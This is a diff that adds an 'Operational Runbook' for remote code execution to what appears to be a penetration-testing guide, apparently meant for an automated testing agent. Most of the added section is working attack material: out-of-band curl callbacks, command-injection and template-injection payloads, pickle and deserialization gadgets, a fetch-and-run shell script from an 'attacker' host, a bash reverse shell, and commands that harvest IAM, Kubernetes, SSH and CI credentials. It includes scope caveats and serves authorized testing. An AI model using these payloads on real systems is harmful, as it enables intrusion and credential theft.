@@ -194,6 +194,108 @@ pop graphic-context
 **Lateral Movement**
 - SSH keys, cloud metadata credentials, internal service tokens
 
+## Operational Runbook
+
+When a candidate sink is identified (template engine, eval, command-line wrapper, deserialization, file converter), this is the canonical exploitation flow. Stop at the OOB oracle stage if `opsec_level: standard` — only progress to shell/data extraction when scope authorizes RCE.
+
+### Step 1 — OOB oracle (the quietest confirmation)
+
+```bash
+# Spin up an OOB receiver
+interactsh-client -v >/tmp/oast.log &
+OAST=$(grep -oE '[a-z0-9]+\.oast\.fun' /tmp/oast.log | head -1)
+
+# Bash / nix shell — try `$(curl ...)` style command substitution
+curl -s "<TARGET>?<PARAM>=\$(curl ${OAST}/rce-bash)"
+
+# Backtick style
+curl -s "<TARGET>?<PARAM>=\`curl ${OAST}/rce-backtick\`"
+
+# Python eval / pickle — try invoking os.system
+curl -s "<TARGET>?<PARAM>=__import__('os').system('curl ${OAST}/rce-py')"
+
+# SSTI — Jinja2 / Twig / FreeMarker — try template-eval primitive
+curl -s "<TARGET>?<PARAM>={{7*7}}"  # baseline: response contains "49"?
+curl -s "<TARGET>?<PARAM>={{config.__class__.__init__.__globals__['os'].popen('curl ${OAST}/ssti').read()}}"
+
+# After ~5s check for callback hits
+grep "rce-" /tmp/oast.log
+```
+
+A DNS / HTTP hit confirms server-side execution. **Critical** finding regardless of severity tag.
+
+### Step 2 — timing oracle (blind / OAST-blocked targets)
+
+```bash
+# Bash sleep
+for delay in 0 5 10; do
+  start=$(date +%s%N)
+  curl -s "<TARGET>?<PARAM>=test;sleep+${delay}" -o /dev/null
+  echo "delay=${delay}: $(( ($(date +%s%N) - start) / 1000000 ))ms"
+done
+# If response time scales with delay → command injection confirmed
+
+# Python — use time.sleep
+curl -s "<TARGET>?<PARAM>=__import__('time').sleep(5)"
+```
+
+### Step 3 — context probing (what shell? what user?)
+
+Once OOB or timing confirms execution, identify the runtime:
+
+```bash
+# Capture output (when allowed); use OAST exfil otherwise
+PROBE='id;uname -a;pwd;cat /etc/passwd | head -3'
+ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PROBE'))")
+curl -s "<TARGET>?<PARAM>=\$(${PROBE})" -o /tmp/rce_probe.txt
+
+# Via OAST when output is hidden
+curl -s "<TARGET>?<PARAM>=\$(curl ${OAST}/?id=\$(id|base64))"
+```
+
+Capture: `uid=`, `gid=`, kernel version, current working directory, container indicators (`/.dockerenv`, `/proc/1/cgroup`).
+
+### Step 4 — payload library by sink class
+
+| Sink | Payload (shell wrapper) | What to try |
+|---|---|---|
+| `system(input)` | `; curl OAST` or `&& curl OAST` or `\|curl OAST` | Try all 4 separators (\`;\`, \`&&\`, \`\|\|\`, \`\|\`) |
+| `exec(input)` (no shell) | newline injection: `\nls\n` | Or argv injection if input is split |
+| `eval(input)` (Python) | `__import__('os').system('curl OAST')` | Bypass `__builtins__` removal via `().__class__.__bases__[0].__subclasses__()` |
+| Jinja2 SSTI | `{{ ''.__class__.__mro__[1].__subclasses__() }}` | Enumerate, find `Popen` subclass |
+| Twig SSTI | `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}` | |
+| FreeMarker SSTI | `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` | |
+| Velocity SSTI | `#set($x=$null.class.forName("java.lang.Runtime")) $x.getRuntime().exec("id")` | |
+| Java deserialization | `ysoserial CommonsCollections5 'curl OAST'` (gadget chain) | Try ALL gadget chains until one works |
+| Python pickle | `c__builtin__\\neval\\n(S'__import__("os").system("curl OAST")'\\ntR.` | Or use `pickle.dumps(class with __reduce__)` |
+| Node.js prototype pollution | `__proto__.shell=true` → triggers child_process exec | Common in Express middleware |
+| XSLT injection | `<xsl:value-of select="system-property('xsl:vendor')"/>` then `php:function` if PHP-XSLT | |
+| GraphQL injection / introspection abuse | `__schema { types { name } }` then craft tailored queries | |
+
+### Step 5 — shell promotion (when scope allows AND opsec_level=loud)
+
+```bash
+# Stage 1 — file write via the RCE primitive
+PAYLOAD='wget http://attacker/shell.sh -O /tmp/s && chmod +x /tmp/s && /tmp/s'
+curl -s "<TARGET>?<PARAM>=\$(${PAYLOAD})"
+
+# Stage 2 — reverse shell (only if engagement allows!)
+# Listener: nc -lvnp 4444
+# Payload: bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
+```
+
+**STOP HERE** unless the engagement scope explicitly authorizes interactive shells. The OOB callback + `id` output is sufficient evidence for the report.
+
+### Step 6 — pivot opportunities (document but don't necessarily exploit)
+
+- **Container escape**: check `/.dockerenv`, `/proc/1/cgroup` for container hint; look for mounted Docker socket (`/var/run/docker.sock`)
+- **Cloud metadata** (overlaps with SSRF): `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+- **K8s service account**: `cat /var/run/secrets/kubernetes.io/serviceaccount/token`
+- **SSH key harvest**: `cat ~/.ssh/id_*` (only if scope authorizes — DO NOT exfiltrate without permission)
+- **CI/CD secrets**: `env`, `cat ~/.docker/config.json`, `cat /opt/ci/secrets`
+
+Document the *capability* (e.g. "RCE permits reading IAM credentials") and stop. Actual exploitation past confirmation requires explicit scope authorization.
+
 ## Testing Methodology
 
 1. **Identify sinks** - Command wrappers, template rendering, deserialization, file converters, report generators, plugin hooks
